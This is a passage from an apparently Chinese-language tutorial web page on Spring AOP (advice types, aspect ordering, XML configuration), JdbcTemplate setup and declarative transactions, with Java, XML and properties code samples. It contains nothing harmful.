class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">    System.out.println(<span class="string">&quot;Logger--&gt;异常通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，异常：&quot;</span>+ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-8、环绕通知"><a href="#3-4-8、环绕通知" class="headerlink" title="3.4.8、环绕通知"></a>3.4.8、环绕通知</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">aroundMethod</span><span class="params">(ProceedingJoinPoint joinPoint)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> Arrays.toString(joinPoint.getArgs());</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法执行之前&quot;</span>);</span><br><span class="line">        <span class="comment">//目标方法的执行，目标方法的返回值一定要返回给外界调用者</span></span><br><span class="line">        result = joinPoint.proceed();</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法返回值之后&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">        throwable.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法出现异常时&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法执行完毕&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-9、切面的优先级"><a href="#3-4-9、切面的优先级" class="headerlink" title="3.4.9、切面的优先级"></a>3.4.9、切面的优先级</h3><p>相同目标方法上同时存在多个切面时，切面的优先级控制切面的<strong>内外嵌套</strong>顺序。</p><ul><li>优先级高的切面：外面</li><li>优先级低的切面：里面</li></ul><p>使用@Order注解可以控制切面的优先级：</p><ul><li>@Order(较小的数)：优先级高</li><li>@Order(较大的数)：优先级低</li></ul><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/27.png"></p><h2 id="3-5，基于XML的AOP（了解）"><a href="#3-5，基于XML的AOP（了解）" class="headerlink" title="3.5，基于XML的AOP（了解）"></a>3.5，基于XML的AOP（了解）</h2><h3 id="3-5-1、准备工作"><a href="#3-5-1、准备工作" class="headerlink" title="3.5.1、准备工作"></a>3.5.1、准备工作</h3><p>参考基于注解的AOP环境</p><h3 id="3-5-2、实现"><a href="#3-5-2、实现" class="headerlink" title="3.5.2、实现"></a>3.5.2、实现</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu.aop.xml&quot;</span>&gt;</span>&lt;/context:componentscan&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置切面类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;loggerAspect&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(*com.atguigu.aop.xml.CalculatorImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;beforeMethod&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:before</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;afterMethod&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">&quot;afterReturningMethod&quot;</span> <span class="attr">returning</span>=<span class="string">&quot;result&quot;</span><span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after-returning</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;afterThrowingMethod&quot;</span> <span class="attr">throwing</span>=<span class="string">&quot;ex&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after-throwing</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:around</span> <span class="attr">method</span>=<span class="string">&quot;aroundMethod&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:around</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;validateAspect&quot;</span> <span class="attr">order</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;validateBeforeMethod&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:before</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="4、声明式事务"><a href="#4、声明式事务" class="headerlink" title="4、声明式事务"></a>4、声明式事务</h1><h2 id="4-1、JdbcTemplate"><a href="#4-1、JdbcTemplate" class="headerlink" title="4.1、JdbcTemplate"></a>4.1、JdbcTemplate</h2><h3 id="4-1-1、简介"><a href="#4-1-1、简介" class="headerlink" title="4.1.1、简介"></a>4.1.1、简介</h3><p>Spring 框架对 JDBC 进行封装，使用 JdbcTemplate 方便实现对数据库操作</p><h3 id="4-1-2、准备工作"><a href="#4-1-2、准备工作" class="headerlink" title="4.1.2、准备工作"></a>4.1.2、准备工作</h3><h4 id="①加入依赖-1"><a href="#①加入依赖-1" class="headerlink" title="①加入依赖"></a>①加入依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基于Maven依赖传递性，导入spring-context依赖即可导入当前所需所有jar包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring 持久化层支持jar包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring 在执行持久化层操作、与持久化层技术进行整合过程中，需要使用orm、jdbc、tx三个jar包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导入 orm 包就可以通过 Maven 的依赖传递性把其他两个也导入 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-orm<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring 测试相关 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- junit测试 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MySQL驱动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.31<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="②创建jdbc-properties"><a href="#②创建jdbc-properties" class="headerlink" title="②创建jdbc.properties"></a>②创建jdbc.properties</h4><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdbc.user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string">atguigu</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://localhost:3306/ssm</span></span><br><span class="line"><span class="attr">jdbc.driver</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure><h4 id="③配置Spring的配置文件"><a href="#③配置Spring的配置文件" class="headerlink" title="③配置Spring的配置文件"></a>③配置Spring的配置文件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 导入外部属性文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置数据源 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;atguigu.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;atguigu.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;atguigu.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;atguigu.password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置 JdbcTemplate --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 装配数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;druidDataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-1-3、测试"><a href="#4-1-3、测试" class="headerlink" title="4.1.3、测试"></a>4.1.3、测试</h3><h4 id="①在测试类装配-JdbcTemplate"><a href="#①在测试类装配-JdbcTemplate" class="headerlink" title="①在测试类装配 JdbcTemplate"></a>①在测试类装配 JdbcTemplate</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(&quot;classpath:spring-jdbc.xml&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCTemplateTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②测试增删改功能"><a href="#②测试增删改功能" class="headerlink" title="②测试增删改功能"></a>②测试增删改功能</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//测试增删改功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUpdate</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into t_emp values(null,?,?,?)&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> jdbcTemplate.update(sql, <span class="string">&quot;张三&quot;</span>, <span class="number">23</span>, <span class="string">&quot;男&quot;</span>);</span><br><span class="line">    System.out.println(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③查询一条数据为实体类对象"><a href="#③查询一条数据为实体类对象" class="headerlink" title="③查询一条数据为实体类对象"></a>③查询一条数据为实体类对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//查询一条数据为一个实体类对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectEmpById</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from t_emp where id = ?&quot;</span>;</span><br><span class="line">    <span class="type">Emp</span> <span class="variable">emp</span> <span class="operator">=</span> jdbcTemplate.queryForObject(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;&gt;(Emp.class), <span class="number">1</span>);</span><br><span class="line">    System.out.println(emp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="④查询多条数据为一个list集合"><a href="#④查询多条数据为一个list集合" class="headerlink" title="④查询多条数据为一个list集合"></a>④查询多条数据为一个list集合</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//查询多条数据为一个list集合</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from t_emp&quot;</span>;</span><br><span class="line">    List&lt;Emp&gt; list = jdbcTemplate.query(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;&gt;(Emp.class));</span><br><span class="line">    list.forEach(emp -&gt; System.out.println(emp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="⑤查询单行单列的值"><a href="#⑤查询单行单列的值" class="headerlink" title="⑤查询单行单列的值"></a>⑤查询单行单列的值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//查询单行单列的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">selectCount</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select count(id) from t_emp&quot;</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> jdbcTemplate.queryForObject(sql, Integer.class);</span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2、声明式事务概念"><a href="#4-2、声明式事务概念" class="headerlink" title="4.2、声明式事务概念"></a>4.2、声明式事务概念</h2><h3 id="4-2-1、编程式事务"><a href="#4-2-1、编程式事务" class="headerlink" title="4.2.1、编程式事务"></a>4.2.1、编程式事务</h3><p>事务功能的相关操作全部通过自己编写代码来实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ...;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 开启事务：关闭事务的自动提交</span></span><br><span class="line">    conn.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 核心操作</span></span><br><span class="line">    <span class="comment">// 提交事务</span></span><br><span class="line">    conn.commit();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">// 回滚事务</span></span><br><span class="line">    conn.rollBack();</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    <span class="comment">// 释放数据库连接</span></span><br><span class="line">    conn.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编程式的实现方式存在缺陷：</p><ul><li>细节没有被屏蔽：具体操作过程中，所有细节都需要程序员自己来完成，比较繁琐。</li><li>代码复用性不高：如果没有有效抽取出来，每次实现功能都需要自己编写代码，代码就没有得到复用。</li></ul><h3 id="4-2-2、声明式事务"><a href="#4-2-2、声明式事务" class="headerlink" title="4.2.2、声明式事务"></a>4.2.2、声明式事务</h3><p>既然事务控制的代码有规律可循，代码的结构基本是确定的，所以框架就可以将固定模式的代码抽取出来，进行相关的封装。</p><p>封装起来后，我们只需要在配置文件中进行简单的配置即可完成操作。</p><ul><li>好处1：提高开发效率</li><li>好处2：消除了冗余的代码</li><li>好处3：框架会综合考虑相关领域中在实际开发环境下有可能遇到的各种问题，进行了健壮性、性</li></ul><p>能等各个方面的优化</p><p>所以，我们可以总结下面两个概念：</p><ul><li><strong>编程式</strong>：<strong>自己写代码</strong>实现功能</li><li><strong>声明式</strong>：通过<strong>配置</strong>让<strong>框架</strong>实现功能</li></ul><h2 id="4-3、基于注解的声明式事务"><a href="#4-3、基于注解的声明式事务" class="headerlink" title="4.3、基于注解的声明式事务"></a>4.3、基于注解的声明式事务</h2><h3 id="4-3-1、准备工作"><a href="#4-3-1、准备工作" class="headerlink" title="4.3.1、准备工作"></a>4.3.1、准备工作</h3><h4 id="①加入依赖-2"><a href="#①加入依赖-2" class="headerlink" title="①加入依赖"></a>①加入依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基于Maven依赖传递性，导入spring-context依赖即可导入当前所需所有jar包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring 持久化层支持jar包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring 在执行持久化层操作、与持久化层技术进行整合过程中，需要使用orm、jdbc、tx三个jar包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导入 orm 包就可以通过 Maven 的依赖传递性把其他两个也导入 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-orm<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring 测试相关 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- junit测试 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MySQL驱动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 